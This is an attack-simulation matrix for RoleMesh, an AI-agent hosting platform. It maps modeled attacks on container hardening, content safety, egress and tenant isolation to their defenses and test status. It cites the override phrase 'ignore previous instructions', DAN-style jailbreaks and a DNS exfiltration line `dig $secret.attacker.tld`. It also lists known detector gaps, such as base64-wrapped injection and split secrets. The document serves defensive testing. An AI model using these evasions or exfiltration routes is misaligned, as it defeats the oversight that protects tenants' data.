# Attack Simulation Matrix

Tracks every modeled attack against RoleMesh's three defense layers (container hardening, content safety pipeline, network egress) plus the tenant-isolation surface, with the current status of each defense.

This document is a **snapshot** keyed to the test suite. The authoritative status lives in `tests/attack_sim/` and `scripts/verify-hardening.sh`; if a status here disagrees with the test outcomes, the tests win. The matrix is meant for orientation — "what attacks have we modeled, what category does this gap fall in, which doc to read for the defense design."

**Source of truth**: `tests/attack_sim/` (automated) and `scripts/verify-hardening.sh` (manual, live container).

For the design rationale behind each defense layer, see:

- [`13-safety-overview.md`](13-safety-overview.md) — the three-layer model
- [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) — A and G categories
- [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) — B4, C, D categories (content checks)
- [`16-egress-control-architecture.md`](16-egress-control-architecture.md) — D4, the I (network egress / gateway plane) category, and parts of B (network exfil)
- [`6-auth-architecture.md`](6-auth-architecture.md), [`4-multi-tenant-architecture.md`](4-multi-tenant-architecture.md) — E category

---

## Status legend

- ✅ **defended** — automated test asserts the defense holds
- ❌ **undefended (known)** — xfail test documents the gap, closes when the named defense ships
- 🔧 **manual only** — verified by runbook, not automated
- 📝 **documented limitation** — we looked, chose not to defend in v1; see linked note

---

## A. Container escape / sandbox breakout

Backed by [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md).

The Docker `HostConfig` contract below is mirrored on Kubernetes (`ROLEMESH_CONTAINER_RUNTIME=k8s`): the same `ContainerSpec` maps to a pod `securityContext` + pod-spec fields, pinned in `test_A_container_escape_k8s_spec.py` (drop ALL caps, `readOnlyRootFilesystem`, `allowPrivilegeEscalation:false`, seccomp `RuntimeDefault`, `runAsNonRoot`, `automountServiceAccountToken:false`, plus the agent-NetworkPolicy label contract for default-deny / gateway-only egress).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| A1 | Fork bomb | PidsLimit 512 | `test_A_container_escape_spec::test_A1_fork_bomb_capped_by_pids_limit` | ✅ spec + 🔧 manual |
| A2 | ptrace another process | seccomp default + CapDrop ALL + no-new-privileges | `test_A2_ptrace_requires_cap_blocked_by_cap_drop` | ✅ spec + 🔧 manual |
| A3 | Mount /proc/kcore | CapDrop ALL (no CAP_SYS_ADMIN) + AppArmor | `test_A3_kcore_mount_requires_sys_admin_which_is_dropped` | ✅ spec + 🔧 manual |
| A4 | Write /etc/shadow, persist rootfs | ReadonlyRootfs + tmpfs carve-outs | `test_A4_rootfs_is_readonly` | ✅ spec + 🔧 manual |
| A5 | Cloud metadata credential theft | ExtraHosts blackhole (`169.254.169.254`, `metadata.google.internal` → `127.0.0.1`) | `test_A5_metadata_endpoints_blackholed` | ✅ spec + 🔧 manual |
| A6 | docker.sock mount injection | `_is_docker_socket_path` basename guard | `test_A6_docker_sock_mount_injection_detected`, `test_A6_spec_to_config_rejects_docker_sock_mount` | ✅ |
| A7 | Privileged container request | `HostConfig` never emits `Privileged` | `test_A7_privileged_never_true` | ✅ |
| A8 | Swap-based memory amplification | `MemorySwap == Memory`; `Swappiness 0` | `test_A8_swap_disabled_equal_to_memory` | ✅ spec + 🔧 manual |

---

## B. Credential / secret theft

Backed by [`6-auth-architecture.md`](6-auth-architecture.md) (TokenVault), [`7-external-mcp-architecture.md`](7-external-mcp-architecture.md) (credential proxy), [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) (secret scanner).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| B1 | Rogue backend smuggles secret via `extra_env` | `CONTAINER_ENV_ALLOWLIST` + `_filter_env_allowlist` | `test_B_secret_exfil::test_B1_*` | ✅ |
| B2 | Probe credential proxy to enumerate providers | No rate limit currently | `test_B2_*` | ❌ xfail (rate-limit gap) |
| B3 | Read `/proc/<pid>/environ` of sibling | CapDrop + seccomp + PID namespace | `test_B3_cross_process_env_read_blocked_by_spec` + runbook | ✅ spec + 🔧 manual |
| B4 | Secret pattern in LLM output / tool result | `secret_scanner` check (detect-secrets) | `test_B4_secret_scanner_catches_patterns` (7 patterns) | ✅ (safety-ml) |
| B4' | Obfuscated secret (split across tokens) | detect-secrets is pattern-based | `test_B4_secret_scanner_obfuscation_limits_documented` | 📝 documented gap |

---

## C. Prompt injection / jailbreak

Backed by [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) (ML-backed checks).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| C1 | Classic "ignore previous instructions" | `llm_guard.prompt_injection` | `test_C_prompt_injection::test_C1_*` (3 variants) | ✅ (safety-ml) |
| C2 | DAN / grandma / role-override jailbreak | `llm_guard.jailbreak` | `test_C2_jailbreak_templates_current_behavior` (2 variants) | 📝 current detector misses DAN-family — print-only for now |
| C3 | Benign inputs (false-positive control) | n/a | `test_C3_benign_inputs_pass` | ✅ (safety-ml) |
| C4 | Base64-wrapped injection | Pattern detector alone misses | `test_C4_base64_wrapped_injection_known_gap` | 📝 documented gap |

---

## D. Data exfiltration

Backed by [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) (`pii.regex`, `domain_allowlist`) and [`16-egress-control-architecture.md`](16-egress-control-architecture.md) (DNS resolver, forward proxy).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| D1 | PII (SSN / CC) in LLM output | `pii.regex` check | `test_D_data_exfil::test_D1_*` | ✅ |
| D2 | Tool call to attacker URL (dict field) | `domain_allowlist` check | `test_D2_tool_call_to_attacker_url_blocked` | ✅ |
| D3 | URL hidden inside Bash command string | `domain_allowlist` walks string leaves | `test_D3_url_in_bash_command_string_detected` | ✅ |
| D4 | DNS exfil via `dig $secret.attacker.tld` | Egress gateway authoritative DNS resolver — `enforce` mode + empty **platform** allowlist NXDOMAINs any non-allowlisted name (EC-2); DNS is a platform policy, not per-tenant (see [`16-egress-control-architecture.md`](16-egress-control-architecture.md)) | `test_D4_dns_exfiltration_blocked_by_egress_dns_policy`, `test_D4_dns_allowlist_is_positive_and_subdomain_safe` | ✅ (policy contract here; gateway-socket path in `tests/egress/test_dns_*`) |
| D5 | Pastebin / transfer.sh data drop | `domain_allowlist` (positive allowlist) | `test_D5_paste_services_blocked` (4 hosts) | ✅ |

---

## E. Tenant isolation

Backed by [`4-multi-tenant-architecture.md`](4-multi-tenant-architecture.md) (dual-pool RLS) and [`6-auth-architecture.md`](6-auth-architecture.md) (IPC trust boundary).

The original E1/E2 drove the approval engine, removed with the human-approval subsystem. The defense — trust the authoritative tenant from the coworker lookup, never the payload's claim — now lives on the safety RPC / event planes (`SafetyRpcServer._handle_request_inner`, `safety/subscriber.py`); the tests pin it there.

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| E1 | Forge tenantId in the request payload | `SafetyRpcServer` drops when the claimed tenant ≠ the coworker's authoritative tenant | `test_E_tenant_isolation::test_E1_forged_tenant_id_dropped` | ✅ |
| E2 | Forge coworkerId belonging to another tenant | Guard anchors on the coworker's authoritative tenant, not the claim | `test_E2_forged_coworker_id_dropped`, `test_E2b_unknown_coworker_id_dropped` | ✅ |
| E6 | NATS subject sidechannel — a *consistent* forge (victim coworker_id **and** matching tenant_id) on core NATS | NATS account-per-tenant / tenant-scoped credentials (not implemented) | `test_E6_consistent_cross_tenant_forge_is_rejected` | ❌ xfail (NATS ACL gap) |

### Identity isolation (credential-proxy plane)

Per-user / per-tenant credential isolation is enforced at the credential proxy (`rolemesh.egress.reverse_proxy`), not the model. A half-trusted container can put any `X-RoleMesh-User-Id` on its outbound requests, so the proxy must derive identity from the **verified** signed token (`identity` from `TokenAuthority.verify`), never that header.

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| E7 (MCP) | Forge `X-RoleMesh-User-Id: userB` on a userA-token request to be handed userB's OIDC token from the shared vault | MCP path keys the vault lookup on `identity.user_id`, not the header (mismatch logged, header ignored) | `test_E_identity_isolation::test_E7_mcp_forged_user_id_header_does_not_select_another_users_token` | ✅ (fixed — the proxy previously trusted the header) |
| E7 (provider) | Forge `X-RoleMesh-User-Id` to steer LLM credential selection | LLM credential resolves by `identity.tenant_id`; the header plays no part | `test_E7_provider_credential_selection_ignores_forged_user_id_header` | ✅ (control) |

---

## G. Denial of service

Backed by [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) (resource ceilings) and [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md) (pipeline cost).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| G1 | Fork bomb inside container | PidsLimit 512 | runbook only | 🔧 manual |
| G2 | Infinite loop agent | `CONTAINER_TIMEOUT` 30 min kill | runbook only | 🔧 manual |
| G3 | Oversized `tool_input` payload | Pipeline check remains linear | `test_G_dos::test_G3_*` | ✅ |
| G5 | Registry lookup churn | Dict-based O(1) lookup | `test_G5_registry_lookup_is_constant_time` | ✅ |
| G6 | Audit write pressure | Single-insert per event | `test_G6_audit_write_pressure` | ✅ |

---

## H. Configuration attacks

Backed by [`6-auth-architecture.md`](6-auth-architecture.md) and [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| H1 | Agent schedules task for another coworker | `can_manage_task` + `task_manage_others` flag | `test_H_config_attack::test_H1_*` | ✅ |
| H2 | Malformed / injected policy config via REST | Pydantic `config_model` + `extra='forbid'` | `test_H2_*` (6 cases, including `__class__` gadget) | ✅ |
| H3 | Agent reaches the host project root via a container mount | `build_volume_mounts` never mounts the host project root into any container, regardless of permissions | `test_H3_project_root_is_never_mounted` | ✅ |
| H4 | Symlink escape from workspace | PID / mount namespace + mount allowlist | runbook only | 🔧 manual |

---

## I. Network egress (gateway plane)

The third defense layer: every outbound TCP/HTTP(S) attempt is funneled through the forward proxy and every raw DNS lookup through the gateway's authoritative resolver, both enforcing a **positive** allowlist. Backed by [`16-egress-control-architecture.md`](16-egress-control-architecture.md). The socket / CONNECT plumbing is covered by `tests/egress/`; these rows are the attack-narrative pins over the policy contracts those sockets enforce, driven through the real gateway seams (`make_egress_domain_check`, `GlobalDnsPolicy`).

| ID | Attack | Defense | Test | Status |
|---|---|---|---|---|
| I1 | Forward-proxy CONNECT to a non-allowlisted attacker host (incl. suffix-confusion `github.com.attacker.tld`) | `egress.domain_rule` reports no match → aggregator blocks | `test_I_egress_gateway::test_I1_*` (4 hosts) | ✅ |
| I2 | Port smuggling — allowlisted SNI on a non-allowlisted port (SSH on `*.github.com`) | `ports` scoping on the rule | `test_I2_allowlisted_name_on_wrong_port_not_matched` | ✅ |
| I3 | Malformed egress rule config (typo'd key, empty list, `extra`, non-dict) | Adapter fails **closed** — any config error ⇒ no match | `test_I3_malformed_config_fails_closed` (5 cases) | ✅ |
| I4 | Empty / truncated host | An empty host never counts as an allowlist match | `test_I4_empty_host_not_matched` | ✅ |
| I5 | DNS exfil default posture / typo'd resolver mode | `GlobalDnsPolicy` `enforce` + empty allowlist; `from_env` rejects an unknown mode (fail-closed boot) | `test_I5_*` (2) | ✅ |

---

## Summary counts (snapshot, 2026-06-25)

The counts below were taken at the time the matrix was first drafted. Run `pytest tests/attack_sim/ -v` for the live picture.

| Category | ✅ | ❌ xfail | 📝 docs-only | 🔧 manual-only |
|---|---|---|---|---|
| A. Container (Docker) | 12 | 0 | 0 | 6 shared |
| A. Container (K8s) | 8 | 0 | 0 | 0 |
| B. Secrets | 10 | 1 | 1 | 1 |
| C. Prompt injection | 7 | 0 | 3 | 0 |
| D. Data exfil | 9 | 0 | 0 | 0 |
| E. Tenant + identity iso | 6 | 1 | 0 | 0 |
| G. DoS | 3 | 0 | 0 | 2 |
| H. Config | 8 | 0 | 0 | 1 |
| I. Network egress | 13 | 0 | 0 | 0 |
| **Total** | **76** | **2** | **4** | **10** |

---

## Known undefended attacks (the xfail list)

These will be "progress signals" when their defense layer lands:

1. **B2 credential-proxy enumeration** — close via rate-limit or per-agent auth on the credential proxy.
2. **E6 consistent cross-tenant identity forge** — the safety-plane guard catches an *inconsistent* forge (coworker_id and tenant_id from different tenants), but a connection presenting a victim's matching coworker_id **and** tenant_id on core NATS is accepted. Close via NATS account-per-tenant / tenant-scoped credentials so a connection cannot speak for another tenant at all.

(D4 DNS exfiltration was previously on this list; EC-2 shipped the authoritative DNS resolver and D4 is now a passing test — see category D / I.)

## Documented limitations (we looked, chose not to defend in v1)

- **B4' split secrets** — detect-secrets is pattern + entropy; an LLM-as-scanner second layer could catch these. Not shipping in v1.
- **C2 DAN-family jailbreak** — llm-guard jailbreak detector misses these. Documented in test as print-only; will flip to ✅ when detector or custom check catches.
- **C4 base64-wrapped injection** — pattern detector misses; LLM-based scanner needed.
- **Manual runbook-only items** — require a live container; spec-level pin is in automated tests, runtime verification in `scripts/verify-hardening.sh`.

---

## Running

```bash
# Default (fast + ML-backed if [safety-ml] installed):
pytest tests/attack_sim/ -v

# Without [safety-ml] extras — C and B4 corpus skip:
pytest tests/attack_sim/ -v -k "not ml"

# Manual runbook (requires live container):
scripts/verify-hardening.sh <agent-container-name>
```
